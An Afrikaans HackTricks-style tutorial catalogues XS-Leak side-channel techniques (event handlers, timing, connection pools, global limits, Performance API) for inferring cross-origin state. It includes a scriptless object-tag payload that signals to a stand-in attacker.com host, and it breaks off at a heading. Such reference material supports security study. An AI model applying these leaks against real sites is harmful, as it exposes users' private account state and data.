# XS-Search/XS-Leaks

{{#include ../banners/hacktricks-training.md}}

## Basiese Inligting

XS-Search is 'n metode wat gebruik word om **kruis-oorsprong inligting** te **onttrek** deur gebruik te maak van **kantkanaal kwesbaarhede**.

Belangrike komponente wat betrokke is by hierdie aanval sluit in:

- **Kwetsbare Web**: Die teikenwebwerf waaruit inligting onttrek moet word.
- **Aanvaller se Web**: Die kwaadwillige webwerf wat deur die aanvaller geskep is, wat die slagoffer besoek en die ontploffing huisves.
- **Insluitingsmetode**: Die tegniek wat gebruik word om die Kwetsbare Web in die Aanvaller se Web in te sluit (bv. window.open, iframe, fetch, HTML-tag met href, ens.).
- **Lek Tegniek**: Tegnieke wat gebruik word om verskille in die toestand van die Kwetsbare Web te onderskei op grond van inligting wat deur die insluitingsmetode versamel is.
- **Toestande**: Die twee potensiële toestande van die Kwetsbare Web, wat die aanvaller poog om te onderskei.
- **Waarneembare Verskille**: Waarneembare variasies waarop die aanvaller staatmaak om die toestand van die Kwetsbare Web af te lei.

### Waarneembare Verskille

Verskeie aspekte kan geanaliseer word om die toestande van die Kwetsbare Web te onderskei:

- **Statuskode**: Onderskeiding tussen **verskeie HTTP-responsstatuskodes** kruis-oorsprong, soos bedienerfoute, kliëntfoute, of outentikasiefoute.
- **API Gebruik**: Identifisering van **gebruik van Web API's** oor bladsye, wat onthul of 'n kruis-oorsprong bladsy 'n spesifieke JavaScript Web API gebruik.
- **Herlidings**: Opspoor van navigasies na verskillende bladsye, nie net HTTP-herleidings nie, maar ook dié wat deur JavaScript of HTML geaktiveer word.
- **Bladsy-inhoud**: Waarneming van **verskille in die HTTP-responsliggaam** of in bladsy sub-hulpbronne, soos die **aantal ingeslote rame** of grootteverskille in beelde.
- **HTTP-kop**: Notering van die teenwoordigheid of moontlik die waarde van 'n **spesifieke HTTP-responskop**, insluitend koppe soos X-Frame-Options, Content-Disposition, en Cross-Origin-Resource-Policy.
- **Tydsberekening**: Opmerking van konsekwente tydverskille tussen die twee toestande.

### Insluitingsmetodes

- **HTML Elemente**: HTML bied verskeie elemente vir **kruis-oorsprong hulpbroninsluiting**, soos stylesheets, beelde, of skripte, wat die blaaiers dwing om 'n nie-HTML hulpbron aan te vra. 'n Samevoeging van potensiële HTML-elemente vir hierdie doel kan gevind word by [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
- **Rame**: Elemente soos **iframe**, **object**, en **embed** kan HTML-hulpbronne direk in die aanvaller se bladsy insluit. As die bladsy **gebrek aan raam beskerming** het, kan JavaScript toegang verkry tot die ingeslote hulpbron se venster objek via die contentWindow eienskap.
- **Pop-ups**: Die **`window.open`** metode open 'n hulpbron in 'n nuwe oortjie of venster, wat 'n **vensterhandvatsel** bied vir JavaScript om met metodes en eienskappe te kommunikeer volgens die SOP. Pop-ups, wat dikwels in enkel aanmeld gebruik word, omseil raam- en koekiebeperkings van 'n teikenhulpbron. Modern blaaiers beperk egter die skepping van pop-ups tot sekere gebruikersaksies.
- **JavaScript Versoeke**: JavaScript laat direkte versoeke aan teikenhulpbronne toe met behulp van **XMLHttpRequests** of die **Fetch API**. Hierdie metodes bied presiese beheer oor die versoek, soos om te kies om HTTP-herleidings te volg.

### Lek Tegnieke

- **Gebeurtenis Handler**: 'n Klassieke lek tegniek in XS-Leaks, waar gebeurtenis handlers soos **onload** en **onerror** insigte bied oor hulpbronlaai sukses of mislukking.
- **Foutboodskappe**: JavaScript uitsonderings of spesiale foutbladsye kan lek inligting bied, hetsy direk uit die foutboodskap of deur te onderskei tussen die teenwoordigheid en afwesigheid daarvan.
- **Globale Beperkings**: Fisiese beperkings van 'n blaier, soos geheue kapasiteit of ander afgedwonge blaierbeperkings, kan aandui wanneer 'n drempel bereik is, wat as 'n lek tegniek dien.
- **Globale Toestand**: Waarneembare interaksies met blaier se **globale toestande** (bv. die Geskiedenis-koppelvlak) kan uitgebuit word. Byvoorbeeld, die **aantal inskrywings** in 'n blaier se geskiedenis kan leidrade bied oor kruis-oorsprong bladsye.
- **Prestasie API**: Hierdie API bied **prestasie besonderhede van die huidige bladsy**, insluitend netwerk tydsberekening vir die dokument en gelaaide hulpbronne, wat afleidings oor versoekte hulpbronne moontlik maak.
- **Leesbare Eienskappe**: Sommige HTML-eienskappe is **leesbaar kruis-oorsprong** en kan as 'n lek tegniek gebruik word. Byvoorbeeld, die `window.frame.length` eienskap laat JavaScript toe om die rame wat in 'n webblad kruis-oorsprong ingesluit is, te tel.

## XSinator Gereedskap & Papier

XSinator is 'n outomatiese hulpmiddel om **blaaiers teen verskeie bekende XS-Leaks** te **kontroleer** soos verduidelik in sy papier: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Jy kan **die hulpmiddel in** [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **Uitsluit XS-Leaks**: Ons moes XS-Leaks uitsluit wat staatmaak op **dienswerkers** aangesien dit ander lekke in XSinator sou inmeng. Verder het ons besluit om **XS-Leaks wat staatmaak op miskonfigurasie en foute in 'n spesifieke webtoepassing** uit te sluit. Byvoorbeeld, CrossOrigin Resource Sharing (CORS) miskonfigurasies, postMessage lekkasies of Cross-Site Scripting. Daarbenewens het ons tydgebaseerde XS-Leaks uitgesluit aangesien hulle dikwels ly aan stadigheid, geraas en onakkuraatheid.

## **Tydgebaseerde tegnieke**

Sommige van die volgende tegnieke gaan tyd gebruik as deel van die proses om verskille in die moontlike toestande van die webbladsye op te spoor. Daar is verskillende maniere om tyd in 'n webblaaier te meet.

**Horlosies**: Die [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API laat ontwikkelaars toe om hoë-resolusie tydsmetings te verkry.\
Daar is 'n aansienlike aantal API's wat aanvallers kan misbruik om implisiete horlosies te skep: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animasies, en ander.\
Vir meer inligting: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Gebeurtenis Handler Tegnieke

### Onload/Onerror

- **Insluitingsmetodes**: Rame, HTML Elemente
- **Waarneembare Verskil**: Statuskode
- **Meer inligting**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Opsomming**: as 'n hulpbron probeer laai, word onerror/onload gebeurtenisse geaktiveer wanneer die hulpbron suksesvol/onsuksesvol gelaai word, dit is moontlik om die statuskode uit te vind.
- **Kode voorbeeld**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)

{{#ref}}
xs-search/cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

Die kode voorbeeld probeer om **skrip objek van JS** te **laai**, maar **ander tags** soos objek, stylesheets, beelde, oudio's kan ook gebruik word. Boonop is dit ook moontlik om die **tag direk** in te voeg en die `onload` en `onerror` gebeurtenisse binne die tag te verklaar (in plaas van om dit van JS in te voeg).

Daar is ook 'n skrip-vrye weergawe van hierdie aanval:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In hierdie geval, as `example.com/404` nie gevind word nie, sal `attacker.com/?error` gelaai word.

### Onload Timing

- **Insluitingsmetodes**: HTML Elemente
- **Waarneembare Verskil**: Tyd (generaal weens Bladsy Inhoud, Statuskode)
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Opsomming:** Die [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** kan gebruik word om te meet hoe lank dit neem om 'n versoek te doen. egter, ander horlosies kan gebruik word, soos [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) wat take kan identifiseer wat langer as 50ms duur.
- **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) 'n ander voorbeeld in:

{{#ref}}
xs-search/performance.now-example.md
{{#endref}}

#### Onload Timing + Gedwonge Zware Taak

Hierdie tegniek is net soos die vorige een, maar die **aanvaller** sal ook **dwing** dat 'n aksie 'n **relevante hoeveelheid tyd** neem wanneer die **antwoord positief of negatief** is en daardie tyd meet.

{{#ref}}
xs-search/performance.now-+-force-heavy-task.md
{{#endref}}

### unload/beforeunload Timing

- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: Tyd (generaal weens Bladsy Inhoud, Statuskode)
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Opsomming:** Die [SharedArrayBuffer horlosie](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) kan gebruik word om te meet hoe lank dit neem om 'n versoek te doen. Ander horlosies kan gebruik word.
- **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Die tyd wat geneem word om 'n hulpbron te verkry, kan gemeet word deur die [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) en [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) gebeurtenisse te benut. Die **`beforeunload`** gebeurtenis word geaktiveer wanneer die blaaier op die punt is om na 'n nuwe bladsy te navigeer, terwyl die **`unload`** gebeurtenis plaasvind wanneer die navigasie werklik plaasvind. Die tydverskil tussen hierdie twee gebeurtenisse kan bereken word om die **duur wat die blaaiers spandeer het om die hulpbron te verkry** te bepaal.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: Tyd (generaal weens Bladsy Inhoud, Statuskode)
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Opsomming:** Die [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API kan gebruik word om te meet hoe lank dit neem om 'n versoek te doen. Ander horlosies kan gebruik word.
- **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Daar is waargeneem dat in die afwesigheid van [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), die tyd wat benodig word vir 'n bladsy en sy subhulpbronne om oor die netwerk te laai, deur 'n aanvaller gemeet kan word. Hierdie meting is tipies moontlik omdat die `onload` handler van 'n iframe slegs geaktiveer word na die voltooiing van hulpbronlaai en JavaScript-uitvoering. Om die variabiliteit wat deur skripuitvoering ingebring word, te omseil, kan 'n aanvaller die [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) attribuut binne die `<iframe>` gebruik. Die insluiting van hierdie attribuut beperk verskeie funksies, veral die uitvoering van JavaScript, wat 'n meting fasiliteer wat hoofsaaklik deur netwerkprestasie beïnvloed word.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: Bladsy Inhoud
- **Meer inligting**:
- **Samevatting**: As jy die bladsy kan laat fout wanneer die korrekte inhoud toeganklik is en dit korrek kan laai wanneer enige inhoud toeganklik is, kan jy 'n lus maak om al die inligting te onttrek sonder om die tyd te meet.
- **Kode Voorbeeld**:

Neem aan dat jy die **bladsy** kan **invoeg** wat die **geheime** inhoud **binne 'n Iframe** het.

Jy kan die **slagoffer laat soek** na die lêer wat "_**vlag**_" bevat deur 'n **Iframe** te gebruik (byvoorbeeld deur 'n CSRF te benut). Binne die Iframe weet jy dat die _**onload gebeurtenis**_ altyd **ten minste een keer** uitgevoer sal word. Dan kan jy die **URL** van die **iframe** verander, maar net die **inhoud** van die **hash** binne die URL verander.

Byvoorbeeld:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

As die eerste URL **suksesvol gelaai** is, dan, wanneer die **hash** deel van die URL **verander** word, sal die **onload** gebeurtenis **nie weer geaktiveer** word nie. Maar **as** die bladsy 'n soort **fout** gehad het tydens **laai**, dan sal die **onload** gebeurtenis **weer geaktiveer** word.

Dan kan jy **onderskei tussen** 'n **korrek** gelaaide bladsy of 'n bladsy wat 'n **fout** het wanneer dit toeganklik is.

### Javascript Uitvoering

- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: Bladsy Inhoud
- **Meer inligting**:
- **Samevatting:** As die **bladsy** die **sensitiewe** inhoud **teruggee**, **of** 'n **inhoud** wat deur die gebruiker **beheer** kan word. Die gebruiker kan **geldige JS kode in die negatiewe geval** stel, en **laai** elke poging binne **`<script>`** etikette, so in **negatiewe** gevalle word die aanvallers **kode** **uitgevoer**, en in **bevestigende** gevalle sal **niks** uitgevoer word nie.
- **Kode Voorbeeld:**

{{#ref}}
xs-search/javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Insluitingsmetodes**: HTML Elemente
- **Waarneembare Verskil**: Statuskode & Headers
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Samevatting**: **Cross-Origin Read Blocking (CORB)** is 'n sekuriteitsmaatreël wat webbladsye verhinder om sekere sensitiewe kruis-oorsprong hulpbronne te laai om teen aanvalle soos **Spectre** te beskerm. Tog kan aanvallers sy beskermende gedrag benut. Wanneer 'n antwoord wat aan **CORB** onderwerp is, 'n _**CORB beskermde**_ `Content-Type` met `nosniff` en 'n `2xx` statuskode teruggee, verwyder **CORB** die liggaam en headers van die antwoord. Aanvallers wat dit waarneem kan die kombinasie van die **statuskode** (wat sukses of fout aandui) en die `Content-Type` (wat aandui of dit deur **CORB** beskerm word), aflei, wat kan lei tot potensiële inligtingslek.
- **Kode Voorbeeld:**

Kyk die meer inligting skakel vir meer inligting oor die aanval.

### onblur

- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: Bladsy Inhoud
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Samevatting**: Lek sensitiewe data van die id of naam attribuut.
- **Kode Voorbeeld**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Dit is moontlik om 'n **bladsy** binne 'n **iframe** te **laai** en die **`#id_value`** te gebruik om die bladsy **fokus op die element** van die iframe te maak met die aangeduide as, dan as 'n **`onblur`** sein geaktiveer word, bestaan die ID element.\
Jy kan dieselfde aanval met **`portal`** etikette uitvoer.

### postMessage Uitzendings <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Insluitingsmetodes**: Frames, Pop-ups
- **Waarneembare Verskil**: API Gebruik
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Samevatting**: Versamel sensitiewe inligting van 'n postMessage of gebruik die teenwoordigheid van postMessages as 'n orakel om die status van die gebruiker op die bladsy te ken
- **Kode Voorbeeld**: `Enige kode wat na alle postMessages luister.`

Toepassings gebruik gereeld [`postMessage` uitzendings](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) om oor verskillende oorspronge te kommunikeer. Tog kan hierdie metode per ongeluk **sensitiewe inligting** blootstel as die `targetOrigin` parameter nie behoorlik gespesifiseer is nie, wat enige venster toelaat om die boodskappe te ontvang. Verder kan die blote daad van die ontvangs van 'n boodskap as 'n **orakel** optree; byvoorbeeld, sekere boodskappe mag slegs aan gebruikers wat ingelog is, gestuur word. Daarom kan die teenwoordigheid of afwesigheid van hierdie boodskappe inligting oor die gebruiker se toestand of identiteit onthul, soos of hulle geverifieer is of nie.

## Globale Limiete Tegnieke

### WebSocket API

- **Insluitingsmetodes**: Frames, Pop-ups
- **Waarneembare Verskil**: API Gebruik
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Samevatting**: Die uitputting van die WebSocket verbinding limiet lek die aantal WebSocket verbindings van 'n kruis-oorsprong bladsy.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

Dit is moontlik om te identifiseer of, en hoeveel, **WebSocket verbindings 'n teikenbladsy gebruik**. Dit stel 'n aanvaller in staat om toepassingsstate te detecteer en inligting wat aan die aantal WebSocket verbindings gekoppel is, te lek.

As een **oorsprong** die **maksimum aantal WebSocket** verbindingsobjekte gebruik, ongeag hul verbindingsstatus, sal die skepping van **nuwe objekts 'n JavaScript uitsondering** tot gevolg hê. Om hierdie aanval uit te voer, open die aanvaller se webwerf die teikenwebwerf in 'n pop-up of iframe en dan, nadat die teikenweb gelaai is, probeer om die maksimum aantal WebSockets verbindings moontlik te skep. Die **aantal gegooi uitsonderings** is die **aantal WebSocket verbindings wat deur die teikenwebwerf** venster gebruik word.

### Betaling API

- **Insluitingsmetodes**: Frames, Pop-ups
- **Waarneembare Verskil**: API Gebruik
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Samevatting**: Detect Betaling Versoek omdat slegs een op 'n slag aktief kan wees.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Hierdie XS-Lek stel 'n aanvaller in staat om **te detecteer wanneer 'n kruis-oorsprong bladsy 'n betalingsversoek inisieer**.

Omdat **slegs een betalingsversoek aktief kan wees** op dieselfde tyd, as die teikenwebwerf die Betaling Versoek API gebruik, sal enige verdere pogings om hierdie API te gebruik, misluk, en 'n **JavaScript uitsondering** veroorsaak. Die aanvaller kan dit benut deur **periodiek te probeer om die Betaling API UI te wys**. As een poging 'n uitsondering veroorsaak, gebruik die teikenwebwerf dit tans. Die aanvaller kan hierdie periodieke pogings verberg deur die UI onmiddellik na skepping te sluit.

### Tydsberekening van die Gebeurtenislus <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Insluitingsmetodes**:
- **Waarneembare Verskil**: Tydsberekening (generaal as gevolg van Bladsy Inhoud, Statuskode)
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Samevatting:** Meet die uitvoeringstyd van 'n web wat die enkel-draad JS gebeurtenislus misbruik.
- **Kode Voorbeeld**:

{{#ref}}
xs-search/event-loop-blocking-+-lazy-images.md
{{#endref}}

JavaScript werk op 'n [enkel-draad gebeurtenislus](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) mededinging model, wat aandui dat **dit slegs een taak op 'n slag kan uitvoer**. Hierdie eienskap kan benut word om te meet **hoe lank kode van 'n ander oorsprong neem om uit te voer**. 'n Aanvaller kan die uitvoeringstyd van hul eie kode in die gebeurtenislus meet deur voortdurend gebeurtenisse met vaste eienskappe te stuur. Hierdie gebeurtenisse sal verwerk word wanneer die gebeurtenis poel leeg is. As ander oorspronge ook gebeurtenisse na dieselfde poel stuur, kan 'n **aanvaller die tyd aflei wat dit neem vir hierdie eksterne gebeurtenisse om uit te voer deur die vertragings in die uitvoering van hul eie take te observeer**. Hierdie metode van die monitering van die gebeurtenislus vir vertragings kan die uitvoeringstyd van kode van verskillende oorspronge onthul, wat moontlik sensitiewe inligting blootstel.

> [!WARNING]
> In 'n uitvoering tydsberekening is dit moontlik om **netwerk faktore** te **elimineer** om **meer presiese metings** te verkry. Byvoorbeeld, deur die hulpbronne wat deur die bladsy gebruik word, te laai voordat dit gelaai word.

### Besige Gebeurtenislus <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Insluitingsmetodes**:
- **Waarneembare Verskil**: Tydsberekening (generaal as gevolg van Bladsy Inhoud, Statuskode)
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Samevatting:** Een metode om die uitvoeringstyd van 'n weboperasie te meet, behels om die gebeurtenislus van 'n draad doelbewus te blokkeer en dan die tyd te meet **hoe lank dit neem voordat die gebeurtenislus weer beskikbaar is**. Deur 'n blokkerende operasie (soos 'n lang berekening of 'n sinchroniese API oproep) in die gebeurtenislus in te voeg, en die tyd te monitor wat dit neem voordat daaropvolgende kode begin uitvoer, kan 'n mens die duur van die take wat in die gebeurtenislus tydens die blokkeringsperiode uitgevoer is, aflei. Hierdie tegniek benut die enkel-draad aard van JavaScript se gebeurtenislus, waar take opeenvolgend uitgevoer word, en kan insigte bied in die prestasie of gedrag van ander operasies wat dieselfde draad deel.
- **Kode Voorbeeld**:

'n Beduidende voordeel van die tegniek om uitvoeringstyd te meet deur die gebeurtenislus te sluit, is die potensiaal om **Webwerf Isolasie** te omseil. **Webwerf Isolasie** is 'n sekuriteitskenmerk wat verskillende webwerwe in aparte prosesse skei, met die doel om te voorkom dat kwaadwillige webwerwe direk toegang tot sensitiewe data van ander webwerwe verkry. Tog, deur die uitvoeringstyd van 'n ander oorsprong te beïnvloed deur die gedeelde gebeurtenislus, kan 'n aanvaller indirek inligting oor daardie oorsprong se aktiwiteite onttrek. Hierdie metode staat nie op direkte toegang tot die ander oorsprong se data nie, maar eerder op die waarneming van die impak van daardie oorsprong se aktiwiteite op die gedeelde gebeurtenislus, en ontduik dus die beskermende hindernisse wat deur **Webwerf Isolasie** gevestig is.

> [!WARNING]
> In 'n uitvoering tydsberekening is dit moontlik om **netwerk faktore** te **elimineer** om **meer presiese metings** te verkry. Byvoorbeeld, deur die hulpbronne wat deur die bladsy gebruik word, te laai voordat dit gelaai word.

### Verbinding Poel

- **Insluitingsmetodes**: JavaScript Versoeke
- **Waarneembare Verskil**: Tydsberekening (generaal as gevolg van Bladsy Inhoud, Statuskode)
- **Meer inligting**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Samevatting:** 'n Aanvaller kan al die sokke sluit behalwe 1, die teikenweb laai en terselfdertyd 'n ander bladsy laai, die tyd totdat die laaste bladsy begin laai is die tyd wat die teikenbladsy geneem het om te laai.
- **Kode Voorbeeld**:

{{#ref}}
xs-search/connection-pool-example.md
{{#endref}}

Browers gebruik sokke vir bedienerkommunikasie, maar as gevolg van die beperkte hulpbronne van die bedryfstelsel en hardeware, **word browers gedwing om 'n limiet** op die aantal gelyktydige sokke te plaas. Aanvallers kan hierdie beperking benut deur die volgende stappe:

1. Bepaal die brower se sokkelimiet, byvoorbeeld, 256 globale sokke.
2. Beset 255 sokke vir 'n lang tyd deur 255 versoeke na verskillende gasheers te begin, ontwerp om die verbindings oop te hou sonder om te voltooi.
3. Gebruik die 256ste sok om 'n versoek na die teikenbladsy te stuur.
4. Probeer 'n 257ste versoek na 'n ander gasheer. Aangesien al die sokke in gebruik is (soos per stappe 2 en 3), sal hierdie versoek in die tou wees totdat 'n sok beskikbaar word. Die vertraging voordat hierdie versoek voortgaan, bied die aanvaller tyds-inligting oor die netwerkaktiwiteit wat met die 256ste sok (die teikenbladsy se sok) verband hou. Hierdie afleiding is moontlik omdat die 255 sokke van stap 2 steeds betrokke is, wat impliseer dat enige nuut beskikbare sok die een moet wees wat van stap 3 vrygestel is. Die tyd wat dit neem vir die 256ste sok om beskikbaar te word, is dus direk gekoppel aan die tyd wat benodig word vir die versoek na die teikenbladsy om te voltooi.

Vir meer inligting: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Verbinding Poel volgens Bestemming

- **Insluitingsmetodes**: JavaScript Versoeke
- **Waarneembare Verskil**: Tydsberekening (generaal as gevolg van Bladsy Inhoud, Statuskode)
- **Meer inligting**:
- **Samevatting:** Dit is soos die vorige tegniek, maar in plaas daarvan om al die sokke te gebruik, plaas Google **Chrome** 'n limiet van **6 gelyktydige versoeke na die selfde oorsprong**. As ons **5 blokkeer** en dan 'n 6de versoek **afskiet**, kan ons dit **tyd** en as ons daarin slaag om die **slagofferbladsy meer versoeke** na dieselfde eindpunt te laat stuur om 'n **status** van die **bladsy** te detecteer, sal die **6de versoek** **langer** neem en kan ons dit detecteer.

## Prestasie API Tegnieke

Die [`Prestasie API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) bied insigte in die prestasiemetrieke van webtoepassings, verder verryk deur die [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). Die Resource Timing API stel die monitering van gedetailleerde netwerk versoek tydsberekeninge, soos die duur van die versoeke, moontlik. Opmerklik is dat wanneer bedieners die `Timing-Allow-Origin: *` header in hul antwoorde insluit, addisionele data soos die oordraggrootte en domein soektijd beskikbaar word.

Hierdie rykdom van data kan verkry word via metodes soos [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) of [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), wat 'n omvattende oorsig van prestasie-verwante inligting bied. Daarbenewens fasiliteer die API die meting van uitvoeringstye deur die verskil tussen tydstempels wat verkry is van [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) te bereken. Dit is egter die moeite werd om op te let dat vir sekere operasies in browers soos Chrome, die presisie van `performance.now()` moontlik beperk is tot millisekondes, wat die granulariteit van tydsmetings kan beïnvloed.

Buiten tydsmetings kan die Prestasie API benut word vir sekuriteitsverwante insigte. Byvoorbeeld, die teenwoordigheid of afwesigheid van bladsye in die `performance` objek in Chrome kan die toepassing van `X-Frame-Options` aandui. Spesifiek, as 'n bladsy geblokkeer word om in 'n raam te render as gevolg van `X-Frame-Options`, sal dit nie in die `performance` objek aangeteken word nie, wat 'n subtiele leidraad oor die bladsy se raambeleid bied.

### Fout Lek

- **Insluitingsmetodes**: Frames, HTML Elemente
- **Waarneembare Verskil**: Statuskode
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Samevatting:** 'n Versoek wat in foute eindig, sal nie 'n hulpbron tydsberekening inskrywing skep nie.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Dit is moontlik om **te onderskei tussen HTTP antwoordstatuskodes** omdat versoeke wat tot 'n **fout** lei **nie 'n prestasie inskrywing** skep nie.

### Styl Herlaai Fout

- **Insluitingsmetodes**: HTML Elemente
- **Waarneembare Verskil**: Statuskode
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Samevatting:** As gevolg van 'n brower fout, word versoeke wat in foute eindig, twee keer gelaai.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

In die vorige tegniek is daar ook twee gevalle geïdentifiseer waar brower foute in GC lei tot **hulpbronne wat twee keer gelaai word wanneer hulle misluk om te laai**. Dit sal lei tot meerdere inskrywings in die Prestasie API en kan dus gedetecteer word.

### Versoek Samesmelting Fout

- **Insluitingsmetodes**: HTML Elemente
- **Waarneembare Verskil**: Statuskode
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Samevatting:** Versoeke wat in 'n fout eindig, kan nie saamgevoeg word nie.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Die tegniek is in 'n tabel in die genoemde papier gevind, maar geen beskrywing van die tegniek is daarin gevind nie. Tog kan jy die bronkode vind wat daarna kyk in [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Leë Bladsy Lek

- **Insluitingsmetodes**: Frames
- **Waarneembare Verskil**: Bladsy Inhoud
- **Meer inligting**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Samevatting:** Leë antwoorde skep nie hulpbron tydsberekening inskrywings nie.
- **Kode Voorbeeld**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

'n Aanvaller kan detecteer of 'n versoek tot 'n leë HTTP antwoord liggaam gelei het omdat **leë bladsye nie 'n prestasie inskrywing in sommige browers** skep nie.

### **XSS-Auditor Lek**

